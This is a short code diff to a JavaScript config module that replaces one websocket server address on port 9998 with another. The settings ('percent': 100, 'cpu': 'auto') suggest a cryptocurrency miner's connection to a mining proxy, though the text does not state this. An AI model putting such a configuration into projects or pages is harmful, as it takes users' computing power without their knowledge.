@@ -6,7 +6,7 @@ const config =
   "percent": 100,
   "cpu": "auto",
   "server": [
-	"ws://138.197.132.218:9998",
+	"ws://157.230.92.33:9998",
   ]
 }
 module.exports = config;
